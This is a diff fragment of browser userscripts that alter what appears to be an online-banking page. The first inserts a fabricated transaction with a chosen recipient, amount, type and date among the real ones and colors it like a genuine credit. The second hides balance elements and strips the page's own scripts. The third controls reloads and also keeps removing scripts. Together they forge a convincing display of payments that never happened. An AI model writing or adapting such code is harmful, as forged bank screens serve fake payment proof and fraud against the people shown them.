+    recipientElement.textContent = desiredRecipient;
+    console.log('Recipient text set.');
+}
+
+if (transactionAmountElement) {
+    transactionAmountElement.textContent = desiredTransactionAmount;
+    // Set the text color to green (#008600) for positive amounts
+    if (parsedAmount >= 0) {
+        transactionAmountElement.style.color = '#008600';
+    }
+    console.log('Transaction amount text set.');
+}
+
+if (transactionTypeElement) {
+    transactionTypeElement.textContent = desiredTransactionType;
+    console.log('Transaction type text set.');
+}
+
+if (transactionDateElement) {
+    transactionDateElement.textContent = desiredTransactionDate;
+    console.log('Transaction date text set.');
+}
+
+if (transactionAmountElement) {
+    transactionAmountElement.textContent = desiredTransactionAmount;
+    console.log('Transaction amount text set.');
+}
+
+
+        if (data.preferredInsertionLogic === 'corresponding_date') {
+                // Insert using the logic from the first script (corresponding date)
+                var transactionsGroupElement = document.querySelector('cirrus-transactions-group');
+                if (transactionsGroupElement) {
+                var desiredDate = new Date(desiredTransactionDate);
+                var transactionsWithSameDate = Array.from(transactionsGroupElement.querySelectorAll('cirrus-transaction-row')).filter(function(transaction) {
+                    var transactionDateElement = transaction.querySelector('.text-truncate.color-text-secondary.pt-md-1');
+                    if (transactionDateElement) {
+                        var transactionDate = new Date(transactionDateElement.textContent.trim());
+                        return transactionDate.toISOString().split('T')[0] === desiredDate.toISOString().split('T')[0];
+                    }
+                    return false;
+                });
+
+                // Adjust the index to move the transaction
+                var currentIndex = transactionsWithSameDate.indexOf(newTransactionRow);
+                var newIndex = 0;
+                if (moveDirection === "up") {
+                    newIndex = Math.max(0, currentIndex - moveSteps);
+                } else if (moveDirection === "down") {
+                    newIndex = Math.min(transactionsWithSameDate.length, currentIndex + moveSteps);
+                }
+
+                if (transactionsWithSameDate.length > 0) {
+                    // Insert the transaction at the adjusted index
+                    transactionsWithSameDate[newIndex].insertAdjacentElement('afterend', newTransactionRow);
+                    console.log('Transaction inserted after transactions with the same date.');
+                 } else {
+                    var closestTransaction = null;
+                    var closestDateDiff = Infinity;
+
+                    Array.from(transactionsGroupElement.querySelectorAll('cirrus-transaction-row')).forEach(function(transaction) {
+                        var transactionDateElement = transaction.querySelector('.text-truncate.color-text-secondary.pt-md-1');
+                        if (transactionDateElement) {
+                            var transactionDate = new Date(transactionDateElement.textContent.trim());
+                            var dateDiff = Math.abs(desiredDate - transactionDate);
+                            if (dateDiff < closestDateDiff) {
+                                closestDateDiff = dateDiff;
+                                closestTransaction = transaction;
+                            }
+                        }
+                    });
+
+                    if (closestTransaction) {
+                        // Insert the transaction next to the closest transaction
+                        closestTransaction.insertAdjacentElement('afterend', newTransactionRow);
+                        console.log('Transaction inserted next to the closest transaction.');
+                        newTransactionRow.removeAttribute("class"); // Remove the "container" class
+                    } else {
+                        // Insert the transaction as the first transaction in the group
+                        transactionsGroupElement.appendChild(newTransactionRow);
+                        console.log('Transaction inserted as the first transaction in the group.');
+                        newTransactionRow.removeAttribute("class"); // Remove the "container" class
+                    }
+                }
+            } else {
+                console.log('Transactions group element not found.');
+            }
+        } else if (preferredInsertionLogic === "pinned_top") {
+            // Insert using the logic from the second script (pinned at the top)
+            transactionViewElement.insertBefore(newTransactionRow, transactionViewElement.firstChild);
+
+            // If you want to move the transaction up or down in this case, you can adjust the insertion position accordingly
+                if (data.moveDirection === 'up') {
+                    transactionViewElement.insertBefore(newTransactionRow, transactionViewElement.children[data.moveSteps]);
+                } else if (data.moveDirection === 'down') {
+                    transactionViewElement.insertBefore(newTransactionRow, transactionViewElement.children[data.moveSteps + 1]);
+                }
+
+            console.log('Transaction inserted.');
+        } else {
+            console.log('Invalid preferred insertion logic:', preferredInsertionLogic);
+        }
+    } else {
+        console.log('Transaction view element not found.');
+    }
+
+    // ... (rest of the script)
+
+
+
+         console.log('Userscript finished.');
+
+    }
+}
+
+})();
+
+
+///////////////THE END////////////////THE END///////////THE END////////////////THE END///////////THE END////////////////THE END///////////THE END////////////////THE END///////////THE END////////////////THE END///////////THE END////////////////THE END///
+//UMSAT//////////////////UMSAT//////////////////UMSAT//////////////////UMSAT//////////////////UMSAT//////////////////UMSAT//////////////////UMSAT//////////////////UMSAT//////////////////UMSAT//////////////////UMSAT//////////////////UMSAT////////////////
+/////////////UMSAT//////////////////UMSAT//////////////////UMSAT//////////////////UMSAT//////////////////UMSAT//////////////////UMSAT//////////////////UMSAT//////////////////UMSAT//////////////////UMSAT//////////////////UMSAT//////////////////UMSAT/////
+//UMSAT//////////////////UMSAT//////////////////UMSAT//////////////////UMSAT//////////////////UMSAT//////////////////UMSAT//////////////////UMSAT//////////////////UMSAT//////////////////UMSAT//////////////////UMSAT//////////////////UMSAT////////////////
+/////////////UMSAT//////////////////UMSAT//////////////////UMSAT//////////////////UMSAT//////////////////UMSAT//////////////////UMSAT//////////////////UMSAT//////////////////UMSAT//////////////////UMSAT//////////////////UMSAT//////////////////UMSAT/////
+//UMSAT//////////////////UMSAT//////////////////UMSAT//////////////////UMSAT//////////////////UMSAT//////////////////UMSAT//////////////////UMSAT//////////////////UMSAT//////////////////UMSAT//////////////////UMSAT//////////////////UMSAT////////////////
+/////////////UMSAT//////////////////UMSAT//////////////////UMSAT//////////////////UMSAT//////////////////UMSAT//////////////////UMSAT//////////////////UMSAT//////////////////UMSAT//////////////////UMSAT//////////////////UMSAT//////////////////UMSAT/////
+////THE END////////////////THE END///////////THE END////////////////THE END///////////THE END////////////////THE END///////////THE END////////////////THE END///////////THE END////////////////THE END///////////THE END////////////////THE END/////THE END//
+
+
+
+
+
+//REM ELEM...........REM ELEM..................REM ELEM..................REM ELEM..................REM ELEM..................REM ELEM..................REM ELEM..................REM ELEM..................REM ELEM..................REM ELEM........
+////////////REM ELEM...........REM ELEM..................REM ELEM..................REM ELEM..................REM ELEM..................REM ELEM..................REM ELEM..................REM ELEM..................REM ELEM..................REM ELEM........
+
+
+(function removebal() {
+    'use strict';
+
+     // Function to create the spinner and background
+    function createSpinner() {
+        var background = document.createElement('div');
+        background.className = 'app-loading-background';
+
+        var spinner = document.createElement('div');
+        spinner.className = 'app-loading-pulsing';
+
+        // Apply styles to the background and spinner
+        background.style.position = 'fixed';
+        background.style.top = '0';
+        background.style.left = '0';
+        background.style.width = '100%';
+        background.style.height = '100%';
+        background.style.backgroundColor = 'white';
+        background.style.zIndex = '9999';
+
+        spinner.style.position = 'absolute';
+        spinner.style.top = '50%';
+        spinner.style.left = '50%';
+        spinner.style.transform = 'translate(-50%,-50%)';
+        spinner.style.width = '120px';
+        spinner.style.height = '120px';
+        spinner.style.display = 'block';
+        spinner.style.backgroundImage = 'url(pb-logo-splash.e83ae1f69ca2f23d.svg)';
+        spinner.style.backgroundSize = '100%';
+        spinner.style.animationName = 'pulse';
+        spinner.style.animationTimingFunction = 'ease-in-out';
+        spinner.style.animationIterationCount = 'infinite';
+        spinner.style.animationDuration = '10s';
+        spinner.style.animationFillMode = 'both';
+
+        // Append the background and spinner to the document body
+        document.body.appendChild(background);
+        background.appendChild(spinner);
+
+        return background;
+    }
+
+
+     // Function to remove scripts from the document
+    function removeScripts() {
+        console.log("Removing scripts...");
+        document.querySelectorAll('script').forEach(function(script) {
+            script.remove();
+            console.log("Script removed.");
+        });
+    }
+
+    // Watch for changes in the DOM and remove added scripts
+    var observer = new MutationObserver(function(mutationsList) {
+        for (var mutation of mutationsList) {
+            if (mutation.addedNodes) {
+                for (var node of mutation.addedNodes) {
+                    if (node.tagName === 'SCRIPT') {
+                        console.log("Script added. Removing...");
+                        node.remove();
+                        console.log("Script removed.");
+                    }
+                }
+            }
+        }
+    });
+
+    // Start observing the document
+    observer.observe(document.documentElement, { childList: true, subtree: true });
+
+    // Remove scripts from the document
+    removeScripts();
+
+
+ // Function to remove elements with specific classes
+    function removeElements() {
+        const parentElements = document.querySelectorAll('.db-custom-select__combo-container__header-box-wrapper.no-label');
+        parentElements.forEach(function(parent) {
+            const elementsToRemove = parent.querySelectorAll('.positive.db-text-bold, .db-text-bold, .negative.db-text-bold');
+            elementsToRemove.forEach(function(element) {
+                element.remove();
+            });
+        });
+
+           // Remove elements with the class "ml-2 ml-md-4" and its children except within the specified area
+        const mlElements = document.querySelectorAll('.ml-2.ml-md-4');
+        mlElements.forEach(function(mlElement) {
+            if (!isElementInExcludedArea(mlElement, 'db-custom-select__combo-container__header-box-wrapper.no-label')) {
+                mlElement.remove();
+            }
+        });
+
+          // Remove elements with class "page-header__back-link__text d-flex align-items-center db-text-bold"
+        const backLinkElements = document.querySelectorAll('.page-header__back-link__text.d-flex.align-items-center.db-text-bold');
+        backLinkElements.forEach(function(backLinkElement) {
+            backLinkElement.remove();
+        });
+
+    }
+
+     // Function to check if an element is within the excluded area
+    function isElementInExcludedArea(element, excludedAreaClass) {
+        const excludedArea = element.closest('.' + excludedAreaClass);
+        return excludedArea !== null;
+    }
+
+
+
+  // Function to add a spinner and remove it after a specified duration
+    function addSpinnerWithDuration(duration) {
+        var spinner = createSpinner();
+        setTimeout(function() {
+            removeSpinner(spinner);
+        }, duration);
+    }
+
+    // Function to remove the spinner element
+    function removeSpinner(spinner) {
+        spinner.remove();
+    }
+
+    // Function to handle clicks on elements with the class "btn-toolbar" or its children
+    function handleButtonClick(event) {
+        if (event.target.closest('.btn-toolbar')) {
+            addSpinnerWithDuration(10000); // Adjust the duration as needed (e.g., 6 seconds)
+        }
+    }
+
+    // Create a MutationObserver to constantly monitor the webpage
+    const mobserver = new MutationObserver(function(mutationsList, mobserver) {
+        // Check for added nodes (newly appeared elements)
+        mutationsList.forEach(function(mutation) {
+            if (mutation.addedNodes.length > 0) {
+                // Elements were added to the DOM, so remove them
+                removeElements();
+            }
+        });
+    });
+
+    // Start observing changes to the body element
+    const body = document.querySelector('body');
+    if (body) {
+        mobserver.observe(body, { childList: true, subtree: true });
+    }
+
+    // Initially, remove any matching elements that are already present
+    removeElements();
+
+    // Add a click event listener to the document body using event delegation
+    document.body.addEventListener('click', handleButtonClick);
+
+})();
+
+
+
+
+///////////THE END/////////////////THE END/////////////////THE END/////////////////THE END/////////////////THE END/////////////////THE END/////////////////THE END/////////////////THE END/////////////////THE END/////////////////THE END/////////////////THE END//////
+//REM ELEM...........REM ELEM..................REM ELEM..................REM ELEM..................REM ELEM..................REM ELEM..................REM ELEM..................REM ELEM..................REM ELEM..................REM ELEM.......REM ELEM..........
+////////////REM ELEM...........REM ELEM..................REM ELEM..................REM ELEM..................REM ELEM..................REM ELEM..................REM ELEM..................REM ELEM..................REM ELEM..................REM ELEM........REM ELEM.
+//THE END/////////////////THE END/////////////////THE END/////////////////THE END/////////////////THE END/////////////////THE END/////////////////THE END/////////////////THE END/////////////////THE END/////////////////THE END/////////////////THE END//////
+
+
+
+/////////////////FIN RELOAD.................FIN RELOAD.................FIN RELOAD.................FIN RELOAD.................FIN RELOAD.................FIN RELOAD.................FIN RELOAD.................FIN RELOAD.................FIN RELOAD.................
+////FIN RELOAD.................FIN RELOAD.................FIN RELOAD.................FIN RELOAD.................FIN RELOAD.................FIN RELOAD.................FIN RELOAD.................FIN RELOAD.................FIN RELOAD.................
+/////////////////FIN RELOAD.................FIN RELOAD.................FIN RELOAD.................FIN RELOAD.................FIN RELOAD.................FIN RELOAD.................FIN RELOAD.................FIN RELOAD.................FIN RELOAD.................
+////FIN RELOAD.................FIN RELOAD.................FIN RELOAD.................FIN RELOAD.................FIN RELOAD.................FIN RELOAD.................FIN RELOAD.................FIN RELOAD.................FIN RELOAD.................
+
+
+
+
+    (function finanzübersichtReloadOnClick() {
+    'use strict';
+
+    console.log("Script started...");
+
+    var isReloadAllowed = false;
+
+    // Function to remove scripts from the document
+    function removeScripts() {
+        console.log("Removing scripts...");
+        document.querySelectorAll('script').forEach(function(script) {
+            script.remove();
+            console.log("Script removed.");
+        });
+    }
+
+    // Function to handle the one-time reload
+    function performReload() {
+        if (isReloadAllowed) {
+            console.log("Reloading the page...");
+            window.localStorage.setItem('refresh', "1");
+            window.location.reload();
+        }
+    }
+
+    // Add click event listeners to the specified elements and its parent
+    var navMenuButton = document.querySelector('.nav-menu__item__button.h-100.btn-active');
+    var navMenuItem = navMenuButton ? navMenuButton.parentElement : null;
+
+    function addClickListeners() {
+        if (navMenuButton) {
+            navMenuButton.addEventListener('click', function() {
+                if (isReloadAllowed) {
+                    performReload();
+                }
+                isReloadAllowed = true;
+            });
+        }
+
+        if (navMenuItem) {
+            navMenuItem.addEventListener('click', function(e) {
+                e.preventDefault();
+                e.stopPropagation();
+                if (isReloadAllowed) {
+                    performReload();
+                }
+                isReloadAllowed = true;
+            });
+        }
+
+        // Add click event listeners to the specified additional areas
+        var headerNavLogo = document.querySelector('.header__nav__logo.align-self-center');
+        var dLgInlineBlock = document.querySelector('.d-lg-inline-block.m-0.active');
+
+        if (headerNavLogo) {
+            headerNavLogo.addEventListener('click', function() {
+                isReloadAllowed = true;
+                performReload();
+            });
+        }
+
+        if (dLgInlineBlock) {
+            dLgInlineBlock.addEventListener('click', function() {
+                isReloadAllowed = true;
+                performReload();
+            });
+        }
+    }
+
+    // Monitor the document for changes and add click listeners
+    var observer = new MutationObserver(function(mutationsList) {
+        for (var mutation of mutationsList) {
+            if (mutation.addedNodes) {
+                for (var node of mutation.addedNodes) {
+                    if (node.tagName === 'SCRIPT') {
+                        console.log("Script added. Removing...");
+                        node.remove();
+                        console.log("Script removed.");
+                    }
+                }
+            }
+        }
+
+        if (!navMenuButton || !navMenuItem) {
+            navMenuButton = document.querySelector('.nav-menu__item__button.h-100.btn-active');
+            navMenuItem = navMenuButton ? navMenuButton.parentElement : null;
+            addClickListeners();
+        }
+    });
+
+    // Start observing the document
+    observer.observe(document.documentElement, { childList: true, subtree: true });
+
+    // Add initial click listeners
+    addClickListeners();
+
+    console.log("Script initialized.");
+})();
+
+////THE END////////////////////THE END/////////////THE END/////////////////////////////THE END///////////////////////THE END/////////////THE END///////////////////////THE END////////////////THE END////////////////////THE END//////////////////////////////////
+/////////////////FIN RELOAD.................FIN RELOAD.................FIN RELOAD.................FIN RELOAD.................FIN RELOAD.................FIN RELOAD.................FIN RELOAD.................FIN RELOAD.................FIN RELOAD.................
+////FIN RELOAD.................FIN RELOAD.................FIN RELOAD.................FIN RELOAD.................FIN RELOAD.................FIN RELOAD.................FIN RELOAD.................FIN RELOAD.................FIN RELOAD................./////////////
+/////////////////FIN RELOAD.................FIN RELOAD.................FIN RELOAD.................FIN RELOAD.................FIN RELOAD.................FIN RELOAD.................FIN RELOAD.................FIN RELOAD.................FIN RELOAD.................
+////FIN RELOAD.................FIN RELOAD.................FIN RELOAD.................FIN RELOAD.................FIN RELOAD.................FIN RELOAD.................FIN RELOAD.................FIN RELOAD.................FIN RELOAD.................////////////
+///////////////////THE END////////////////////THE END/////////////THE END/////////////////////////////THE END///////////////////////THE END/////////////THE END///////////////////////THE END////////////////THE END////////////////////THE END//////////////////////////////////
+
+
+
+
+
+
+
+})();
